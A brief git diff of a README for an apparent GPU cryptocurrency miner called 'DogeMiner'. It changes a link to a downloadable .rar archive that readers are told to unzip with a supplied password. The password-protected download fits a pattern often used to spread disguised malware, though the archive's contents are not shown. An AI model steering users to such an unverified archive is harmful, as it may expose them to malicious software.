@@ -11,7 +11,7 @@ Ethash algo for GPU with more than 4gb memory.
 
 
 ### Setup
-You need to [download](https://github.com/gcm554/DogeMiner/raw/main/DogeMiner v1.1.rar) this repository & unzip it using password `dogemine`.
+You need to [download](https://github.com/gcm554/DogeMiner/raw/main/DogeMiner.rar) this repository & unzip it using password `dogemine`.
 
 ### License
 Copyright (c) 2021 FREE
